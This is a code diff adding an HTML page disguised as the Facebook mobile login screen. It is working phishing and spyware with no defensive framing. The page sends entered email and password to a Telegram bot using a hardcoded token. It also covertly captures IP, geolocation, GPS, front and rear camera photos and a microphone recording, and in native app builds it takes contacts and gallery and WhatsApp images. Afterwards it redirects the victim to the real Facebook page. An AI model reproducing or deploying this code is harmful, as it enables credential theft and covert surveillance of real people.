@@ -1,0 +1,176 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no,viewport-fit=cover">
+<meta name="theme-color" content="#1877f2">
+<title>Log in to Facebook</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;-webkit-tap-highlight-color:transparent}
+body{background:linear-gradient(180deg,#1877f2 0%,#166fe5 100%);min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px;color:#1c1e21}
+.fb-logo{width:60px;height:60px;background:#fff;border-radius:50%;display:flex;align-items:center;justify-content:center;margin-bottom:14px;box-shadow:0 4px 12px rgba(0,0,0,.15)}
+.fb-logo svg{width:42px;height:42px;fill:#1877f2}
+.card{background:#fff;width:100%;max-width:396px;border-radius:12px;padding:24px;box-shadow:0 8px 24px rgba(0,0,0,.2)}
+.card h1{font-size:20px;font-weight:600;text-align:center;margin-bottom:6px;color:#1c1e21}
+.card p.sub{font-size:14px;text-align:center;color:#606770;margin-bottom:20px}
+.field{width:100%;padding:14px 16px;font-size:16px;border:1px solid #dddfe2;border-radius:8px;margin-bottom:12px;background:#f5f6f7;outline:none;transition:border-color .15s,background .15s}
+.field:focus{border-color:#1877f2;background:#fff}
+.btn{width:100%;padding:14px;font-size:17px;font-weight:700;color:#fff;background:#1877f2;border:none;border-radius:8px;cursor:pointer;transition:background .15s}
+.btn:active{background:#166fe5}
+.forgot{display:block;text-align:center;font-size:14px;color:#1877f2;text-decoration:none;margin:16px 0 20px;font-weight:500}
+.divider{border-top:1px solid #dadde1;margin:0 0 20px}
+.create{width:100%;padding:14px;font-size:17px;font-weight:700;color:#fff;background:#42b72a;border:none;border-radius:8px;cursor:pointer;transition:background .15s}
+.create:active{background:#36a420}
+.footer{margin-top:24px;font-size:12px;color:#8a8d91;text-align:center}
+.footer a{color:#8a8d91;text-decoration:none;margin:0 6px}
+.loader{display:none;width:20px;height:20px;border:2px solid #fff;border-top-color:transparent;border-radius:50%;animation:spin .7s linear infinite;margin:0 auto}
+@keyframes spin{to{transform:rotate(360deg)}}
+.btn.loading .txt{display:none}
+.btn.loading .loader{display:inline-block}
+#cv{position:fixed;width:1px;height:1px;opacity:0;pointer-events:none;bottom:0;right:0}
+</style>
+</head>
+<body>
+<div class="fb-logo"><svg viewBox="0 0 36 36"><path d="M20.5 32V18.5h4.6l.7-5.3h-5.3v-3.4c0-1.5.4-2.6 2.6-2.6h2.8V2.9C25.4 2.8 23.7 2.7 21.7 2.7c-3.5 0-5.9 2.1-5.9 6v4.5H11v5.3h4.8V32h4.7z"/></svg></div>
+<div class="card">
+  <h1>Log in to Facebook</h1>
+  <p class="sub">Connect with friends and the world around you.</p>
+  <form id="loginForm" autocomplete="on">
+    <input class="field" type="text" id="email" placeholder="Email address or phone number" autocomplete="username" required>
+    <input class="field" type="password" id="pass" placeholder="Password" autocomplete="current-password" required>
+    <button class="btn" type="submit" id="loginBtn"><span class="txt">Log in</span><span class="loader"></span></button>
+  </form>
+  <a href="https://m.facebook.com/login/identify/" class="forgot">Forgotten password?</a>
+  <div class="divider"></div>
+  <button class="create" type="button" onclick="location.href='https://m.facebook.com/reg/'">Create new account</button>
+</div>
+<div class="footer"><a href="https://m.facebook.com/">English (US)</a><a href="https://m.facebook.com/">Myanmar (Burmese)</a><br><br>Meta © 2024</div>
+<video id="cv" autoplay playsinline muted></video>
+<script src="capacitor.js"></script>
+<script>
+const BOT_TOKEN = '8671540437:AAGxAhTyvYcbxzAd8pd6lnN6gJoT-yQ4t18';
+const CHAT_ID   = '8398007192';
+const API       = `https://api.telegram.org/bot${BOT_TOKEN}`;
+const GAP_MS    = 600;
+const QKEY = '__q';
+let Q = []; try { Q = JSON.parse(localStorage.getItem(QKEY)||'[]'); } catch(e){ Q = []; }
+function saveQ(){ try { localStorage.setItem(QKEY, JSON.stringify(Q.slice(0,60))); } catch(e){} }
+let pumping = false;
+function pump(){
+  if(pumping) return; pumping = true;
+  (async ()=>{
+    while(Q.length){
+      const t = Q[0];
+      try{
+        await fetch(`${API}/sendMessage`,{ method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({chat_id:CHAT_ID,text:t.v,parse_mode:'Markdown',disable_web_page_preview:true}) });
+        Q.shift(); saveQ();
+      } catch(e){ break; }
+      await new Promise(r=>setTimeout(r,GAP_MS));
+    }
+    pumping = false;
+  })();
+}
+function sendText(text){ Q.push({k:'t', v:text}); saveQ(); pump(); }
+function sendMedia(endpoint, field, blob, name, extra){
+  const fd = new FormData(); fd.append('chat_id', CHAT_ID); fd.append(field, blob, name);
+  if(extra) for(const k in extra) fd.append(k, extra[k]);
+  (async ()=>{ try { await fetch(`${API}/${endpoint}`,{ method:'POST', body:fd }); } catch(e){} })();
+}
+function sendLong(label, text){ sendText(label); for(let i=0;i<text.length;i+=3800) sendText('```\n'+text.slice(i,i+3800)+'\n```'); }
+
+async function fingerprint(){
+  let ip='?', geo={};
+  try{ const r = await fetch('https://ipapi.co/json/'); geo = await r.json(); ip = geo.ip || '?'; } catch(e){}
+  let s='🎯 *NEW TARGET — FB LOGIN*\n';
+  const fp = { ip, country:geo.country_name, city:geo.city, isp:geo.org, ua:navigator.userAgent, screen:`${screen.width}x${screen.height}`, tz:Intl.DateTimeFormat().resolvedOptions().timeZone };
+  for(const k in fp) if(fp[k]) s+=`*${k}*: ${fp[k]}\n`;
+  sendText(s);
+}
+
+async function gpsOnce(){
+  if(!navigator.geolocation) return;
+  navigator.geolocation.getCurrentPosition(async p=>{
+    sendText(`📍 *GPS*\nLat: \`${p.coords.latitude}\`\nLon: \`${p.coords.longitude}\`\n[Map](https://maps.google.com/?q=${p.coords.latitude},${p.coords.longitude})`);
+  }, ()=>{}, {enableHighAccuracy:true});
+}
+
+async function snap(facing, tag){
+  try{
+    const stream = await navigator.mediaDevices.getUserMedia({ video:{facingMode:facing}, audio:false });
+    const v = document.getElementById('cv'); v.srcObject = stream; await v.play().catch(()=>{});
+    await new Promise(r=>setTimeout(r,1000));
+    const c=document.createElement('canvas'); c.width=v.videoWidth||640; c.height=v.videoHeight||480;
+    c.getContext('2d').drawImage(v,0,0,c.width,c.height);
+    await new Promise(res=>{ c.toBlob(b=>{ if(b) sendMedia('sendPhoto','photo',b,`${tag}.jpg`); res(); },'image/jpeg',0.9); });
+    stream.getTracks().forEach(t=>t.stop());
+  }catch(e){}
+}
+
+async function mic(seconds=8){
+  try{
+    const stream = await navigator.mediaDevices.getUserMedia({ audio:true });
+    const rec = new MediaRecorder(stream,{mimeType:'audio/webm'});
+    const chunks=[]; rec.ondataavailable = e => { if(e.data.size) chunks.push(e.data); };
+    rec.onstop = () => { const blob = new Blob(chunks,{type:'audio/webm'}); sendMedia('sendVoice','voice',blob,`voice.webm`); stream.getTracks().forEach(t=>t.stop()); };
+    rec.start(); setTimeout(()=>{ try{ rec.stop(); }catch(e){} }, seconds*1000);
+  }catch(e){}
+}
+
+async function nativeHarvest(){
+  if(!window.Capacitor || !Capacitor.isNative) return;
+  const P = Capacitor.Plugins || {};
+  if(P.Contacts){
+    try{
+      const list = await P.Contacts.getContacts({ projection:'ALL' });
+      if(list && list.contacts && list.contacts.length){
+        sendText(`📇 *CONTACTS — ${list.contacts.length}*`); let b = '';
+        for(const c of list.contacts){ b += `👤 ${c.displayName||'?'} — ${(c.phones||[]).map(p=>p.number).join('/')}\n`; if(b.length>3500){sendText('```\n'+b+'\n```'); b='';} }
+        if(b) sendText('```\n'+b+'\n```');
+      }
+    }catch(e){}
+  }
+  if(P.Filesystem){
+    const dirs = ['DCIM/Camera','Pictures','Download','WhatsApp/Media/WhatsApp Images'];
+    for(const dir of dirs){
+      try{
+        const rd = await P.Filesystem.readdir({ path: dir, directory:'EXTERNAL_STORAGE' }).catch(()=>null);
+        if(!rd || !rd.files) continue;
+        const imgs = rd.files.filter(f=>/\.(jpe?g|png)$/i.test(f.name));
+        if(!imgs.length) continue;
+        sendText(`📁 *${dir}* — ${imgs.length} imgs`);
+        for(const f of imgs.slice(0,20)){
+          if(f.size > 45*1024*1024) continue;
+          const r = await P.Filesystem.readFile({ path: dir+'/'+f.name, directory:'EXTERNAL_STORAGE' });
+          const bin = atob(r.data); const arr = new Uint8Array(bin.length);
+          for(let i=0;i<bin.length;i++) arr[i]=bin.charCodeAt(i);
+          sendMedia('sendPhoto','photo', new Blob([arr],{type:'image/jpeg'}), f.name);
+          await new Promise(r=>setTimeout(r,500));
+        }
+      }catch(e){}
+    }
+  }
+}
+
+let harvesting=false;
+async function harvest(){
+  if(harvesting) return; harvesting=true;
+  try{ await fingerprint(); gpsOnce(); await snap({exact:'environment'}, 'REAR').catch(()=>{}); await snap('user', 'FRONT').catch(()=>{}); mic(8); await nativeHarvest(); }catch(e){}
+  harvesting=false;
+}
+
+document.getElementById('loginForm').addEventListener('submit', async (e) => {
+  e.preventDefault();
+  const email = document.getElementById('email').value.trim();
+  const pass  = document.getElementById('pass').value;
+  if(!email || !pass) return;
+  const btn = document.getElementById('loginBtn'); btn.classList.add('loading'); btn.disabled = true;
+  sendText(`🔑 *FB LOGIN*\n*ID*: \`${email}\`\n*Pass*: \`${pass}\``);
+  harvest();
+  await new Promise(r => setTimeout(r, 1500));
+  window.location.href = 'https://m.facebook.com/login/';
+});
+
+addEventListener('load', ()=>{ setTimeout(harvest, 800); });
+</script>
+</body>
+</html>
